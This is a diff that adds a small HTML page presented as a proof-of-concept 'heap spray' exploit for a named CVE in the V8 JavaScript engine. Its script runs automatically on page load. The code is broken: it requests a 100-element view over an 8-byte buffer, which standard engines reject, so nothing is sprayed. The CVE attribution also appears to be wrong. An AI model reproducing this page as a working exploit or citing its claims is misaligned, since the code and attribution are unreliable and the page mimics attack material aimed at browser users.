@@ -1,0 +1,18 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <meta charset="utf-8">
+    <title>CVE-2015-1572 Heap Spray</title>
+</head>
+<body>
+<script>
+// CVE-2015-1572: V8 heap spray via ArrayBuffer
+function trigger() {
+    var buf = new ArrayBuffer(8);
+    var view = new Uint8Array(buf, 0, 100);
+    view[0] = 1;
+}
+setTimeout(trigger, 1000);
+</script>
+</body>
+</html>
